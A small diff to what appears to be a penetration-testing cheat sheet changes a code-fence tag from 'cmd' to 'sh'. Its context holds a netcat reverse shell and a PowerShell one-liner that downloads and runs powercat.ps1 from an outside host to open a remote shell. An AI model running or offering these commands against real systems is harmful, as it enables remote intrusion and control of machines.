@@ -33,7 +33,7 @@ nc <listening_host> <listening_port> -e /bin/bash
 
 #### Powercat reverse shell example
 
-```cmd
+```sh
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
 ```
 
